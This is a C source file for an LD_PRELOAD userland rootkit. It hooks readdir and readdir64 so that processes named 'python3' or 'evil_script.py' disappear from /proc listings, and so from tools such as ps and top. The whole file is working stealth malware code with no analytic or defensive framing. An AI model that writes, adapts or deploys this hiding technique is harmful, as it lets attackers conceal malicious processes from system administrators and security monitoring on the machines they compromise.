#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

/*
 * List of process names to hide.
 */
static const char* processes_to_filter[] = {
    "python3",
    "evil_script.py",
    NULL
};

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its PID
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

/*
 * Readdir macro to wrap both readdir and readdir64 safely
 */
#define DECLARE_READDIR(func_name, dirent_type)                           \
static dirent_type* (*original_##func_name)(DIR*) = NULL;                \
                                                                          \
dirent_type* func_name(DIR *dirp)                                         \
{                                                                         \
    if(original_##func_name == NULL) {                                    \
        original_##func_name = dlsym(RTLD_NEXT, #func_name);              \
        if(original_##func_name == NULL) {                                \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());           \
            return NULL;                                                  \
        }                                                                 \
    }                                                                     \
                                                                          \
    dirent_type* dir;                                                     \
                                                                          \
    while(1) {                                                             \
        dir = original_##func_name(dirp);                                 \
        if(dir) {                                                          \
            char dir_name[256];                                            \
            char process_name[256];                                       \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&          \
               strcmp(dir_name, "/proc") == 0 &&                          \
               get_process_name(dir->d_name, process_name)) {             \
                for (int i = 0; processes_to_filter[i] != NULL; i++) {    \
                    if(strcmp(process_name, processes_to_filter[i]) == 0) { \
                        dir = NULL;                                       \
                        break;                                            \
                    }                                                     \
                }                                                         \
                if (dir == NULL) continue;                                \
            }                                                             \
        }                                                                 \
        break;                                                            \
    }                                                                     \
    return dir;                                                           \
}

DECLARE_READDIR(readdir, struct dirent)
DECLARE_READDIR(readdir64, struct dirent64)
